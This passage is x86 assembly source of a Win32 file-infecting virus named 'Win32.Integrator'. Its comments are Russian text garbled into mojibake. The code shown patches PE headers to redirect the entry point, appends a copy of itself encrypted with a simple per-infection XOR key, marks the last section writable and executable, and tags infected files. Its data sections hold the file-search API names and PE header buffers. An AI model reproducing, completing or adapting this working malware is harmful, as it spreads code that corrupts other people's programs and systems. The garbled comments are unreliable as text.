                           ;  à£ã¬¥â  á¢®¥£®) ª®¬ ¤ë,  à£ã¬¥â ã  á - DWORD
                           ; - 4 ¡ ©â . *®á«¥ ¢á¥å íâ¨å ®¯¥à æ¨© ¢ ESI ã  á
                           ; RVA á«¥¤ãé¥© ¯®á«¥ JMP dd X ª®¬ ¤ë.
                           sub eax, [ebp+pe_entry_point_rva] ; PE.EntryPoint RVA
                           neg eax
                           mov dword ptr [ebp+original_ip], eax
   ; ‡ ¯¨è¥¬ ¢ § £®«®¢®ª ®¢ãî â®çªã ¢å®¤ 
                           mov eax, [ebp+sec_rva] ; RVA ¯®á«¥¤¥© á¥ªæ¨¨
                                                  ; ¢ ¯ ¬ïâ¨
                           add eax, [ebp+sec_physical_size]
                                              ; ”¨§¨ç¥áª¨© à §¬¥à ¯®á«¥¤¥©
                                              ; á¥ªæ¨¨
                           mov dword ptr [ebp+pe_entry_point_rva], eax
                                                ; PE.EntryPoint RVA
   ; “áâ ®¢¨¬ ãª § â¥«ì   ª®¥æ ä ©« 
                           mov esi, dword ptr [ebp+our_place]
                           call set_pointer
   ; ‘¬¥¨¬ ª«îç ¤«ï è¨äà®¢ª¨
   another:                call [ebp+ourGetTickCount] ;  -«ï £¥¥à â®à
                                                      ; á«ãç ©ëå ç¨á¥« :)))
                           xor al, ah
                           xor al, byte ptr [ebp+key]
                           or al, al ; ¥«ì§ï çâ®¡ ª«îç ¡ë« ã«¥¬
                           jz another
                           cmp al, 020h ; ¨ 020h (’¥ªáâ®¢ë¥ áâà®ª¨ ¡ã¤ãâ
                                        ; ç¨â ¡¥«ìë, ® ¢ ¤àã£®¬ à¥£¨áâà¥)
                           je another
                           mov byte ptr [ebp+key], al
   ; ‡ ¯¨è¥¬ ¥è¨äà®¢ ãî ç áâì ¢¨àãá  ¢ ä ©«
                           mov esi, cryptstart - virstart
                           lea edi, [ebp+virstart]
                           call write_file
   ; § è¨äàã¥¬ â¥«®
                           mov al, byte ptr [ebp+key]
                           lea esi, [ebp+cryptstart]
                           lea edi, [ebp+cryptbuf]
                           mov ecx, cryptlen
   cryptor:                mov dl, byte ptr [esi]
                           inc esi
                           xor dl, al
                           mov byte ptr [edi], dl
                           inc edi
                           loop cryptor
   ; ‡ ¯¨è¥¬ è¨äà®¢ ãî ç áâì ¢¨àãá  ¢ ä ©«
                           mov esi, cryptlen
                           lea edi, [ebp+cryptbuf]
                           call write_file
   ; ‚ëç¨á«¨¬ ¤«¨ã §¢¨àï, ¢ëà ¢¥ãî   ObjectAlign
                           mov eax, virlen
                           mov ecx, [ebp+pe_object_align]
                           dec ecx
                           add eax, ecx
                           not ecx
                           and eax, ecx
   ; Œ®¤¨ä¨æ¨àã¥¬ PE header ¨ Header á¥ªæ¨¨
                           add [ebp+pe_image_size], eax
                           add [ebp+pe_size_of_code], eax
                           add [ebp+sec_virtual_size], eax
   ; ‚ëç¨á«¨¬ ¤«¨ã §¢¨àï, ¢ëà ¢¥ãî   FileAlign
                           mov eax, virlen
                           mov ecx, [ebp+pe_file_align]
                           dec ecx
                           add eax, ecx
                           not ecx
                           and eax, ecx
   ; Œ®¤¨ä¨æ¨àã¥¬ § £®«®¢®ª ¯®á«¥¤¥© á¥ªæ¨¨
                           add [ebp+sec_physical_size], eax
                                         ; ”¨§¨ç¥áª¨© à §¬¥à ¯®á«¥¤¥© á¥ªæ¨¨
   ; *®áâ ¢¨¬ ¯®á«¥¤¥© á¥ªæ¨¨  âà¨¡ãâ read/write/execute/init_data
                           mov dword ptr [ebp+sec_obj_flags], 0e0000040h
   ; *®áâ ¢¨¬ ¬¥âªã § à ¦¥®áâ¨
                           mov word ptr [ebp+pe_user_minor], 'WG'
   ; “áâ ®¢¨¬ ãª § â¥«ì    ç «® PE § £®«®¢ª 
                           mov esi, dword ptr [ebp+mz_pe_pointer]
                           call set_pointer
   ; ‡ ¯¨è¥¬ ¬®¤¨ä¨æ¨à®¢ ë© PE § £®«®¢®ª
                           mov esi, 0f8h
                           lea edi, [ebp+pe_header]
                           call write_file
   ; “áâ ®¢¨¬ ãª § â¥«ì    ç «® § £®«®¢ª  ¯®á«¥¤¥© á¥ªæ¨¨
                           mov esi, dword ptr [ebp+last_sec]
                           call set_pointer
   ; ‡ ¯¨è¥¬ ¬®¤¨ä¨æ¨à®¢ ë© § £®«®¢®ª ¯®á«¥¤¥© á¥ªæ¨¨
                           mov esi, 028h
                           lea edi, [ebp+sec_header]
                           call write_file
   ; ‡ ªà®¥¬ ä ©«
   ; ‚ë§®¢ CloseHandle:
   ;               push <å¥¤« ä ©« >
   ;               call CloseHandle
   close_file:             push ebx
                           call [ebp+ourCloseHandle]
   it_not_exe:             ret
   do_file                 endp

   read_file               proc
   ; ESI = ‘ª®ª® ç¨â âì
   ; EDI = €¤à¥á ¡ãää¥à  ¤«ï áç¨âª¨
   ;
   ; ‚ë§®¢ ReadFile:
   ;               push 0
   ;               push offset <¡ãä¥à ¤«ï ª®«¨ç¥áâ¢  áç¨â ëå ¡ ©â>
   ;               push <áª®ª  ç¨â âì>
   ;               push offset <¡ãää¥à ªã¤  áç¨âë¢ âì>
   ;               push <å¥¤« ®âªàëâ®£® ä ©« >
   ;               call ReadFile
                           pusha
                           push 0
                           lea eax, [ebp+bytesread]
                           push eax
                           push esi
                           push edi
                           push ebx
                           call [ebp+ourReadFile]
                           popa
                           retn
   endp

   set_pointer             proc
   ; ESI = Šã¤  ãáâ ®¢¨âì
   ;
   ; ‚ë§®¢ SetFilePointer:
   ;               push <®âªã¤  ®âáç¥â> ; FILE_BEGIN = 0
   ;               push 0
   ;               push <¯®§¨æ¨ï ªã¤  ãáâ ®¢¨âì>
   ;               push <å¥¤« ä ©« >
   ;               call SetFilePointer
                           pusha
                           push 0
                           push 0
                           push esi
                           push ebx
                           call [ebp+ourSetFilePointer]
                           popa
                           retn
   endp

   write_file              proc
   ; ESI = ‘ª®ª  ¯¨á âì
   ; EDI = Žâªã¤  ¯¨á âì
   ;
   ; ‚ë§®¢ WriteFile:
   ;               push 0
   ;               push offset <¡ãä¥à ¤«ï ª®«¨ç¥áâ¢  § ¯¨á ëå ¡ ©â>
   ;               push <áª®ª  ¯¨á âì>
   ;               push offset <¡ãää¥à ®âªã¤  á¯¨áë¢ âì>
   ;               push <å¥¤« ®âªàëâ®£® ä ©« >
   ;               call WriteFile
                           push 0
                           lea eax, [ebp+bytesread]
                           push eax
                           push esi
                           push edi
                           push ebx
                           call [ebp+ourWriteFile]
                           retn
   endp

   ;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
   ;º ‡¢¨à¥¢ë¥ ¤ ë¥                                                          º
   ;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
   getFindFirstFileA       db 'FindFirstFileA',0
   getFindNextFileA        db 'FindNextFileA',0
   getFindClose            db 'FindClose',0
   getGetCurrentDirectoryA db 'GetCurrentDirectoryA',0
   getSetCurrentDirectoryA db 'SetCurrentDirectoryA',0
   getCreateFileA          db 'CreateFileA',0
   getSetFilePointer       db 'SetFilePointer',0
   getReadFile             db 'ReadFile',0
   getWriteFile            db 'WriteFile',0
   getCloseHandle          db 'CloseHandle',0
   getSetFileAttributesA   db 'SetFileAttributesA',0
   getGetProfileStringA    db 'GetProfileStringA',0
   getWriteProfileStringA  db 'WriteProfileStringA',0
   getlstrcmpi             db 'lstrcmpi',0
   getGetTickCount         db 'GetTickCount',0

   maska                   db '*.*',0

   IF PROCDIR EQ 1
   root_dir                db '.',0
   ELSE
   root_dir                db '\',0
   ENDIF

   dotdot                  db '..',0

   ini_section             db 'Temp',0
   ini_key                 db 'Saved'
   default_string          db 0

   ourname                 db '[Win32.Integrator] by Gobleen Warrior//SMF', 0
                           db 'People can fly... Everything can happen...'
   cryptlen                equ $-cryptstart
   virlen                  equ $-virstart

   ; *â® áà ì ¢áïª ï â¨¯  ¢à¥¬¥ëå ¤ ëå, ¯¥à¥¬¥ëå ¨ â.¤.
   temp_ip                 dd ?
   bytesread               dd ?
   our_place               dd ?
   last_sec                dd ?
   search_handler          dd ?
   current_dir             db 260 dup (?)

   get_string_flag         db ?
   start_fuck_flag         db ?
   get_out_flag            db ?
   saved_string            db 260 dup (?)
   start_ini_string        dd ?
   end_ini_string          dd ?
   counter                 dd ?

   ourGetProcAdress        dd ?
   ourFindFirstFileA       dd ?
   ourFindNextFileA        dd ?
   ourFindClose            dd ?
   ourGetCurrentDirectoryA dd ?
   ourSetCurrentDirectoryA dd ?
   ourCreateFileA          dd ?
   ourSetFilePointer       dd ?
   ourReadFile             dd ?
   ourWriteFile            dd ?
   ourCloseHandle          dd ?
   ourSetFileAttributesA   dd ?
   ourGetProfileStringA    dd ?
   ourWriteProfileStringA  dd ?
   ourlstrcmpi             dd ?
   ourGetTickCount         dd ?

   ; FIND áâàãªâãà 
   findstruc:
   ff_attr                 dd ?
   ff_create_time          dd ?
                           dd ?
   ff_last_access_time     dd ?
                           dd ?
   ff_last_write_time      dd ?
                           dd ?
   ff_file_size_high       dd ?
   ff_file_size_low        dd ?
   ff_reserved             dd ?
                           dd ?
   ff_fullname             db 260 dup (?)
   ff_dosname              db 14 dup (?)

   ; *ãää¥à ¤«ï MZ § £®«®¢ª 
   mz_header:
   mz_signat               dw ?  ; á¨£ âãà 
   mz_lastpage             dw ?  ; ®áâ â®ª ®â ¤¥«¥¨ï à §¬¥à  ä ©«    512
   mz_pagecount            dw ?  ; à¥§ã«ìâ â íâ®£® ¤¥«¥¨ï+1
                           dw ?  ;
   mz_hdrsize              dw ?  ; à §¬¥à § £®«®¢ª  …•… ¢ 16-¡ ©â¨ª å
                           dw ?  ;
                           dw ?  ;
   mz_exe_ss               dw ?  ; SS ä ©«  ¯à¨ § £àã§ª¥
   mz_exe_sp               dw ?  ; SP ä ©«  ¯à¨ § £àã§ª¥
   mz_chcksum              dw ?  ;
   mz_exe_ip               dw ?  ; IP ä ©«  ¯à¨ § £àã§ª¥
   mz_exe_cs               dw ?  ; CS ä ©«  ¯à¨ § £àã§ª¥
                           dw ?  ;
   mz_overlay              dw ?  ; *®¬¥à ®¢¥à«¥©®£® á¥£¬¥â  (0-®á®¢®©)
                           db 32 dup (0) ;
   mz_pe_pointer           dd ?  ; ‘¬¥é¥¨¥ PE § £®«®¢ª 

   ; *ãää¥à ¤«ï PE § £®«®¢ª 
   pe_header:
   pe_signat               dd ?
   pe_cpu_type             dw ?
   pe_num_of_objects       dw ?
   pe_time_date            dd ?
   pe_coff_tbl_pointer     dd ?
   pe_coff_tbl_size        dd ?
   pe_nt_hdr_size          dw ?
   pe_flags                dw ?
   pe_magic                dw ?
   pe_link_major           db ?
   pe_link_minor           db ?
   pe_size_of_code         dd ?
   pe_size_of_init_data    dd ?
   pe_size_of_unin_data    dd ?
   pe_entry_point_rva      dd ?
   pe_base_of_code         dd ?
   pe_base_of_data         dd ?
   pe_image_base           dd ?
   pe_object_align         dd ?
   pe_file_align           dd ?
   pe_os_major             dw ?
   pe_os_minor             dw ?
   pe_user_major           dw ?
   pe_user_minor           dw ?
   pe_subsys_major         dw ?
   pe_subsys_minor         dw ?
                           dd ?
   pe_image_size           dd ?
   pe_header_size          dd ?
   pe_file_chksum          dd ?
   pe_subsys               dw ?
   pe_dll_flags            dw ?
   pe_stack_reserve_size   dd ?
   pe_stack_commit_size    dd ?
   pe_heap_reserve_size    dd ?
   pe_heap_commit_size     dd ?
   pe_loader_flags         dd ?
   pe_num_rva_and_sizes    dd ?
   pe_export_table_rva     dd ?
   pe_export_table_size    dd ?
   pe_import_table_rva     dd ?
   pe_import_table_size    dd ?
   pe_resource_table_rva   dd ?
   pe_resource_table_size  dd ?
   pe_exception_table_rva  dd ?
   pe_exception_table_size dd ?
   pe_secutity_table_rva   dd ?
   pe_security_table_size  dd ?
   pe_fixup_table_rva      dd ?
   pe_fixup_table_size     dd ?
   pe_debug_table_rva      dd ?
   pe_debug_table_size     dd ?
   pe_image_descr_tbl_rva  dd ?
   pe_image_descr_tbl_size dd ?
   pe_machine_table_rva    dd ?
   pe_machine_table_size   dd ?
   pe_tls_rva              dd ?
   pe_tls_size             dd ?
   pe_load_cfg_rva         dd ?
   pe_load_cfg_size        dd ?
                           dq ?
   pe_iat_table_rva        dd ?
   pe_iat_table_size       dd ?
                           dq ?
                           dq ?
                           dq ?

   ; *ãää¥à ¤«ï § £®«®¢ª  ¯®á«¥¤¥© á¥ªæ¨¨
   sec_header:
   sec_name                dq ?           ; 00 01 02 03 04 05 06 07
   sec_virtual_size        dd ?           ; 08 09 0a 0b
   sec_rva                 dd ?           ; 0c 0d 0e 0f
   sec_physical_size       dd ?           ; 10 11 12 13
   sec_phys_offset         dd ?           ; 14 15 16 17
                           db 0ch dup (?) ; 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23
   sec_obj_flags           dd ?           ; 24 25 26 27

   ; *ãää¥à ¤«ï è¨äà®¢ª¨ â¥« 
   cryptbuf                db cryptlen dup (?)

   ;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
   ;º „ ë¥ ¤«ï ¯¥à¢®£® § ¯ãáª                                                º
   ;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
   _title                  db '[Win32.Integrator] by Gobleen Warrior//SMF',0
   _text                   db 'THANKS A LOT TO ALL PEOPLE, WHICH HELPED ME',0

                           .code
   start:                  jmp virstart
   hoststart:              push 0
                           push offset _title
                           push offset _text
                           push 0
                           call MessageBoxA
                           push 0
                           call ExitProcess
   end                     start
